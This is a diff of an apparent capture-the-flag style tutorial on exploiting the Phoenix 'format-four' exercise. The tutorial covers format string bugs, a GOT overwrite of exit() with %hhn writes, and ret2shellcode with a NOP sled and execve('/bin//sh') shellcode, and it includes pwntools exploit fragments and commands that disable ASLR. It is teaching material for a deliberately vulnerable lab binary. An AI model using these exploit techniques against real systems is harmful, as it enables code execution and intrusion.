@@ -9,9 +9,12 @@ The Phoenix series by [Exploit Education](https://exploit.education) is an excel
 
 ## **Introduction**
 
-The purpose of this article is to explore an introductory format strings vulnerability
+This purpose of this article is to explore the exploitation of an introductory format string vulnerability, first through a generic memory-corruption approach and then through the ret2shellcode paradigm.
 
 What will this article cover:
+
+### **Generic memory corruption**
+
  - **What is a format string**
  - **How does this become dangerous**
  - **Differentiation between normal overflows**
@@ -22,14 +25,20 @@ What will this article cover:
  - **Finding the offsets with `Python`**
  - **Shifting via block size**
  - **Using `pwntools` to overwrite memory**
+
+### **ret2shellcode**
+
  - **Adapting the script into ret2shellcode**
+ - **The requirements for ret2shellcode**
+ - **What is the stack**
  - **Finding the address of the buffer with `GDB`**
  - **Approximating payload size**
  - **Using `pwntools` to write an exploit**
 
 ## **What is a format string**
 
-A format string is simply a template text containing special placeholder tokens called format specifiers that specify the type and layout of the data to be displayed. 
+A format string is simply a template text containing special placeholder tokens called format specifiers that specify the type and layout of the data to be displayed.
+
 ```c
 #include <stdio.h>
 
@@ -39,9 +48,9 @@ int main() {
     return 0;
 }
 ```
-An example of a format string being used in the C programming language that defines an integer placeholder as 1 then calls the `printf` function to print the placeholder to the standard output and then return normally.
+Above is an example of a format string being used in the C programming language that defines an integer placeholder as 1 then calls the `printf` function to print the placeholder to the standard output and then returns normally.
 
-The `printf` function in C only requires one argument, the format argument. `printf(const char *format, ...)`. The other optional and variable number of arguments follow this first argument and contain the data to be printed. 
+The `printf` function in C only requires one argument, the format argument. `printf(const char *format, ...)`. The other optional and variable number of arguments follow this first argument and contain the data to be printed. Below are examples of format specifiers.
 
 | Specifier | What the specifier does | Why it's important |
 | --- | --- | --- |
@@ -53,9 +62,9 @@ The `printf` function in C only requires one argument, the format argument. `pri
 
 ## **How does this become dangerous**
 
-When an attacker controls the actual format string of a format string function, i.e. `printf(input, ...)`. It allows the attacker to arbitrarily insert format specifiers in unintended locations. The side effect of this capability is that the attacker can now both read and write arbitrary memory.
+When an attacker controls the actual format string of a format string function, i.e. `printf(input)`, it allows the attacker to arbitrarily insert format specifiers in unintended locations. The side effect of this capability is that the attacker can now both read and write arbitrary memory.
 
-For example, in `printf(input)`, the user controls the input variable meaning that in this context they control the format string. If the user were to specify `%p` as their input then since `printf()` expects a matching argument for the specifier, it instead reads whatever happens to be in the argument registers and stack slots.
+To illustrate how this capability actually becomes dangerous we'll take the prior example, in `printf(input)`, the user controls the input variable meaning that in this context the user controls the format string. If the user were to specify `%p` as their input then since `printf()` expects a matching argument for the specifier, it instead reads whatever happens to be in the argument registers and stack slots.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -128,11 +137,11 @@ gcc -fno-stack-protector -z execstack -no-pie -o format-four format-four.c
 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space # Change back to 2 after
 ```
 
-Our goal is to redirect the execution into the congratulations, I will show a solution that simply overwrites the memory address and an example of writing shellcode to a buffer and then redirecting execution flow into the shellcode.
+Our goal is to redirect the execution flow via the format string vulnerability in the `bounce()` function. I will show a solution that simply overwrites the memory address as well as an example of writing shellcode to a buffer and then redirecting execution flow into the shellcode. 
 
 ## **What is the `Global Offset` Table**
 
-The `Global Offset Table`, usually referred to as the GOT in short, is a section of an ELF binary that stores absolute memory addresses of external functions and data from libraries. The `Global Offset Table` itself is a target for exploitation as the Procedural Linkage Table redirects execution through it and when the attacker controls the addresses in the `Global Offset Table`, they therefore control execution flow via the Procedural Linkage Table. It's kind of like having control of the ball that the dog will chase. 
+The `Global Offset Table`, usually referred to as the GOT in short, is a section of an ELF binary that stores absolute memory addresses of external functions and data from libraries. The `Global Offset Table` itself is a target for exploitation as the Procedural Linkage Table redirects execution through it and when the attacker controls the addresses in the `Global Offset Table`, they therefore control execution flow via the Procedural Linkage Table.
 
 ## **Finding the `exit()` address with `objdump`**
 
@@ -160,7 +169,8 @@ From the output of the `objdump` command we can see that the slot for the `exit(
 
 ## **Finding an address with `GDB`**
 
-Now, all we need to do is find the address we want to overwrite via `GDB`
+Now, all we need to do is find the address we want to overwrite the `exit()` address with via `GDB`.
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ gdb -q ./format-four 
@@ -180,11 +190,11 @@ End of assembler dump.
 (gdb)
 ```
 
-From the output of `GDB` we see that the congratulations function starts at the memory address `0x000000000040117d`
+From the output of `GDB` we can see that the congratulations function starts at the memory address `0x000000000040117d`.
 
 ## **Finding the offsets with `Python`**
 
-Using an inline `Python` script for a simple payload we can use to determine the offset that our input lands at
+Using an inline `Python` script for a simple payload we can use to determine the offset that our input lands at. A is `\x41` so repeating A's is `\x41\x41\x41...`.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -213,7 +223,7 @@ AAAAAAAA
 0xa70250a70
 ```
 
-Our A's appear in the 12th slot of the script's output. We can verify that the input is stored in adjacent memory by expanding the payload
+Our A's appear in the 12th slot of the script's output. We can verify that the input is stored in adjacent memory by expanding the payload.
 
 ```
 ┌──(kali㉿kali)-[~]
@@ -247,30 +257,36 @@ As seen by the output of the updated script we have confirmed that the input ove
 
 ## **Shifting via block size**
 
-First, to understand the structure of our payload we'll need to understand the two format specifiers we'll be using to accomplish exploitation in this context. The full string is `%Ac%B$hhn` where A and B are arbitrary integers. We can split this format string into the two format specifiers that comprise it, `%Ac` and `%B$hhn` where B is an arbitrary integer. `%Nc` is the manner in which we pad N bytes and `%N$hhn` is the manner in which we write to the byte at the Nth location.
+First, to understand the structure of our payload we'll need to understand the two format specifiers we'll be using to accomplish exploitation in this context. The full string is `%Ac%B$hhn` where A and B are arbitrary integers. We can split this format string into the two format specifiers that comprise it, `%Ac` and `%B$hhn` where A and B are arbitrary integers. `%Ac` is the manner in which we pad A bytes and `%B$hhn` is the manner in which we write to the byte at the Bth location.
 
-In order to overwrite the memory we'll need to overwrite the three lowest bytes (all those 0's in `0x0000000000404018` and `0x000000000040117d` don't really matter, just `0x404018` and `0x40117d`). This means we'll need three blocks. Given that we'll likely need to pad by two digits that gives us the section `%NNc` where N is an integer and we need to write those digits so that gives us the section `%NN$hhn` where N is an integer. These two sections will be joined together into `%NNc%NN$hhn` to form a block which has a total length of 11 bytes. We need three of these blocks to overwrite the three bytes meaning we'll have a total length of 33 bytes. 
+In order to overwrite the memory we'll need to overwrite the three lowest bytes (all those 0's in `0x0000000000404018` and `0x000000000040117d` don't really matter, just `0x404018` and `0x40117d`). This means we'll need three blocks. Given that we'll likely need to pad by two digits that gives us the section `%NNc` where N is an integer 0-9 and we'll need to write those digits so that gives us the section `%NN$hhn` where N is an integer 0-9 as well. These two sections will be joined together into `%NNc%NN$hhn` to form a block which has a total length of 11 bytes. We need three of these blocks to overwrite the three bytes meaning we'll have a total length of 33 bytes. 
 
-These blocks must be 8-byte aligned so we'll need to pad them to reach a 40-byte long format block, or five quad-words. Two separate things determine which $ number reaches our pointers, and it's worth keeping them apart. 
+These blocks must be 8-byte aligned so we'll need to pad them to reach a 40-byte long format block, or five quad-words (8-bytes each). Two separate things determine which $ number actually reaches our pointers, and it's worth keeping them apart. 
 
-First, the absolute numbering: under the System V calling convention x64 uses, the first arguments aren't passed on the stack, they're passed in registers. The `printf()` format string is in the `RDI` register, and the next five arguments come from the `RSI`, `RDX`, `RCX`, `R8`, and `R9` registers; only the sixth argument onward is read from the stack. Those register slots are a fixed shift baked into every number and it's part of why our A's landed as argument 12 rather than something lower in the `%p` enumeration. 
+First, the absolute numbering: under the System V calling convention that the x64 architecture uses, the first arguments aren't passed on the stack, they're passed in registers. The `printf()` format string is in the `RDI` register, and the next five arguments come from the `RSI`, `RDX`, `RCX`, `R8`, and `R9` registers; only the sixth argument onward is read from the stack. Those register slots are a fixed shift baked into every number and it's part of why our A's landed as argument 12 rather than something lower in the `%p` enumeration. 
 
 Second, and this is the part that changes with our payload: our pointers don't sit at the start of the buffer, they sit after the format block. The block here is five quad-words long, so the pointers begin five slots past where the buffer starts.
 
+In other words, there is both a static shift due to the architecture and a dynamic shift based on size of the payload. This concept may make a bit more sense later by contrasting the shift in the second exploit to the shift in the first exploit.
+
 ```
-[ format ]
-[ format ]
-[ format ]
-[ format ]
-[ format ]
-[ stack  ]
+[ format ]       [  RSI  ]
+[ format ]       [  RDX  ]
+[ format ]       [  RCX  ]
+[ format ]       [  R8   ]
+[ format ]       [  R9   ]
+[ stack  ]       [ stack ]
+
+Dynamic Shift    Fixed Shift
 ```
+
+In this specific case, the static shift due to the architecture and the dynamic shift due to the size of the payload coincidentally overlap, this is not a common occurence. Both shifts are 5 here but the fixed shift is already reflected in the original output of 12, so only the dynamic shift of +5 is applied to reach 17.
 
 Putting it together: the buffer begins at slot 12, and our pointers sit five quad-words further in, so slot 12 maps to argument 17, slot 13 to argument 18, and slot 14 to argument 19. Watch the second number, not the first. When the format block grows, this is the offset that moves.
 
 ## **Using `pwntools` to overwrite memory**
 
-In this example solution, I will simply solve the exercise by overwriting the address
+In this example solution, I will simply solve the exercise by overwriting the address.
 
 ```python
 from pwn import *
@@ -318,7 +334,7 @@ fmt += b'%61c%19$hhn'        # +61 = 125 -> 0x7d  written to (ptr at arg 19)
 fmt  = fmt.ljust(40, b'A')   # pad to 5 qwords (8-byte boundary)
 ```
 
-We need to write the values `0x11`, `0x40`, and `0x7d` into registers in order to use them to write the value `0x000000000040117d` later. The reason we do 17 or `0x11` first is because the `printf()` counter only goes up so we need to write in ascending order.
+We need to write the values `0x11`, `0x40`, and `0x7d` into memory in order to use them to write the value `0x000000000040117d` later. The reason we do 17 or `0x11` first is because the `printf()` counter only goes up so we need to write in ascending order.
 
 | Padding | Write | Value |
 | --- | --- | --- |
@@ -351,6 +367,8 @@ arg 19 (0x7d) <--- 0x7d is written in 1st position (0x404018 + 0)
 ^ Big Endian
 ```
 
+These bytes must be stored in little-endian order at `0x404018`.
+
 ### **The fifth section spawns the process and feeds the payload to the binary**
 
 ```python
@@ -382,9 +400,24 @@ As a refresher for those who have read my introduction to ret2shellcode and a br
 
 The first crucial step in adapting this exploit to work with `shellcode` is that we must find the buffer that we plan to place the `shellcode` in, in order to accurately redirect execution flow to the buffer address when we control it. 
 
+## **The requirements for ret2shellcode**
+
+In order for an exploit using the `ret2shellcode` paradigm to work we need two things:
+
+- Executable stack
+- Known address of `shellcode`
+
+There are two main mitigations aimed at this specific technique (which is why we compiled the binary the way we did), `NX/DEP` which marks the stack pages as non-executable and `ASLR` which randomizes the base of the memory addresses. 
+
+## **What is "the stack"**
+
+A `stack` is a linear structure for data. Like a physical stack of plates, the `stack` follows a Last in, First Out (LIFO) principle: You can only place a new plate on the very top, and when you need to take a plate, you must remove the one from the top first.
+
+The stack frame will manage the local variables of a function, this is important to understand because our `shellcode` will be a local variable and thus will be managed by the stack.
+
 ## **Finding the address of the buffer with `GDB`**
 
-First, we'll need to find the address of the buffer. The address to the buffer is used as the `RDI` register argument of the internal function `bounce()` so we can set a breakpoint and read the value of the `RDI` register to extract the buffer's address.
+First, we'll need to find the address of the buffer we want to write to. The address to the buffer is used as the `RDI` register argument of the internal function `bounce()` so we can set a breakpoint and read the value of the `RDI` register to extract the buffer's address.
 ```
 ┌──(kali㉿kali)-[~]
 └─$ gdb -q ./format-four
@@ -437,7 +470,7 @@ I hope this diagram offers more insight into understanding the structure, the lo
 
 In other words, we know that we will perform four full writes in the general format of `%NNc%NN$hhn` where N is an integer and two zero-gap writes `%NN$hhn` where N is an integer and the length is very likely to be seven given previous knowledge of the binary.
 
-If we then, knowing that the other block which contain some form of `%NNc%NN$hhn`, use the previous example as a reference (11 bytes per full write block) we can infer that the total length may be something like 4(11) + 2(7) or 58. 
+The full-write blocks from the previous example take the same %NNc%NN$hhn form. Under the assumption that the full write blocks will be similar in length across exploits, we can reuse that block's length of 11 bytes. That assumption puts the estimated total at 4(11) + 2(7), or 58 bytes in length. 
 
 58 is not divisible by eight so we'll need to pad to the next number divisible by 8 which is 64.
 
@@ -470,9 +503,11 @@ AAAAAAAA
 0xa70250a70
 ``` 
 
+You can notice in the first slot of the output, `0x7fffffffcd70` differs from the buffer address `0x7fffffffdd00` that we found via `GDB` with `set exec-wrapper env -i`. This is precisely why it's important to ensure that the environment is exactly the same when working with absolute addresses.
+
 ## **Using `pwntools` to write an exploit**
 
-The exploit looks a bit more complicated but it's really not that bad once we break things down into more manageable chunks
+The exploit looks a bit more complicated but it's really not that bad once we break things down into more manageable chunks.
 
 ```python
 from pwn import *
@@ -524,7 +559,7 @@ ARG0 = 20
 shell_addr = BUF + FMT_LEN + 48 + SLED // 2
 ```
 
-The first variable is the address of the buffer variable, the second variable is the address of the `exit()` function as defined by the `Global Offset Table`, the third variable is the length of the format string payload, the fourth variable is the length of the `NOP` sled we'll implement to enhance reliability of our exploit, the fifth variable is the starting argument. The final variable in this section is the "address of the `shellcode`", in reality we add the buffer address to the length of the format string and then add that number to 48, which is the length six quad word pointers take up (6 * 8 = 48), then finally we add half of the sled to our "address of the shellcode" so our "address to the shellcode" is actually in the middle of a `NOP` sled to improve reliability
+The first variable is the address of the buffer variable, the second variable is the address of the `exit()` function as defined by the `Global Offset Table`, the third variable is the length of the format string payload, the fourth variable is the length of the `NOP` sled we'll implement to enhance reliability of our exploit, the fifth variable is the starting argument. The final variable in this section is the "address of the `shellcode`". In reality, we add the buffer address to the length of the format string and then add that number to 48, which is the length six quad word pointers take up (6 * 8 = 48), then finally we add half of the sled to our "address of the `shellcode`" so our "address of the `shellcode`" is actually in the middle of a `NOP` sled to improve reliability.
 
 ### **The third section splits the target address into byte-writes**
 
@@ -533,7 +568,7 @@ tgt = sorted(((shell_addr >> (8*i)) & 0xff, EXIT_GOT + i) for i in range(6))
 ```
 This section may seem a bit complicated if you're not used to the syntax and bitwise operations because there is a decent amount going on in this one line. 
 
-`(shell_addr >> (8*i)) & 0xff` pulls out byte number i, counting from the low end. `>> (8*i)` shifts the address right by i whole bytes (8 bits each), moving the byte you want down into the lowest position; `& 0xff` masks off everything above it, leaving just that one byte. And then this process is repeated 6 times by the for loop
+`(shell_addr >> (8*i)) & 0xff` pulls out byte number i, counting from the low end. `>> (8*i)` shifts the address right by i whole bytes (8 bits each), moving the byte you want down into the lowest position; `& 0xff` masks off everything above it, leaving just that one byte. And then this process is repeated 6 times by the for loop.
 
 ```
 i=0:  >> 0   -> 0x7fffffffdd90 & 0xff = 0x90   (144)
@@ -544,7 +579,7 @@ i=4:  >> 32  -> 0x7fff         & 0xff = 0xff   (255)
 i=5:  >> 40  -> 0x7f           & 0xff = 0x7f   (127)
 ```
 
-This creates the byte part of `(byte, EXIT_GOT + i)`, by resolving that second part, `EXIT_GOT + i` we can create **(byte, destination)** pairs
+This creates the byte part of `(byte, EXIT_GOT + i)`. By resolving that second part, `EXIT_GOT + i`, we can create **(byte, destination)** pairs.
 
 ```
 (0x90, 0x404018)
@@ -555,7 +590,7 @@ This creates the byte part of `(byte, EXIT_GOT + i)`, by resolving that second p
 (0x7f, 0x40401d)
 ```
 
-You may have noticed that these pairs are not in order and you may recall from earlier that the count only goes up so the final part of this line sorts them
+You may have noticed that these pairs are not in order and you may recall from earlier that the count only goes up so the final part of this line sorts them.
 
 ```
 (0x7f, 0x40401d)   127
@@ -587,7 +622,7 @@ First, we define the accumulators that accumulate the format string, the count f
 fmt, count, ptrs = b'', 0, []
 ```
 
-Next, we run the loop
+Next, we run the loop.
 
 ```python
 for val, addr in tgt:
@@ -614,7 +649,7 @@ The first line left justifies the format string payload by padding to the format
 
 #### **Part 1 - stack fixup**
 
-This section allows for space for the shellcode to actually run
+This section allows for space for the shellcode to actually run.
  
 | Bytes | Instruction | Effect |
 |---|---|---|
@@ -622,7 +657,7 @@ This section allows for space for the shellcode to actually run
  
 #### **Part 2 - execve("/bin//sh", NULL, NULL)**
 
-This section replaces the current process image with a new `/bin//sh` process image
+This section replaces the current process image with a new `/bin//sh` process image.
  
 | Bytes | Instruction | Effect |
 |---|---|---|
